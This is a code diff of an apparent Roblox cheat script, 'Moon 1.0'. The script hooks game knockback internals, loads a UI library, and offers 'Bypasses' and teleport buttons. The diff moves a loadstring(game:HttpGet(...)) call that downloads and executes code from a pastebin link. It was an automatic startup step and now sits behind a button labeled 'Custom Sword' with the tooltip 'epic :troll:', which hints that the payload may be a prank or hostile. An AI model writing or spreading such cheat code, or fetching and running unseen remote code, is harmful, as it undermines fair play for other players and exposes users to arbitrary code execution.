@@ -1,7 +1,6 @@
 --reorganizing of mooon
 
-loadstring(game:HttpGet("https://pastebin.com/raw/PRvL4Fib"))()
-wait()
+
 local KnockbackTable = debug.getupvalue(require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Moon 1.0", "DarkTheme")
@@ -407,4 +406,8 @@ BypassesSection:NewButton("TP Player | Damc", "TP Player", function()
 
 
 	part:Destroy()
+end)
+
+OtherSection:NewButton("Custom Sword", "epic :troll:", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/PRvL4Fib"))()
 end)
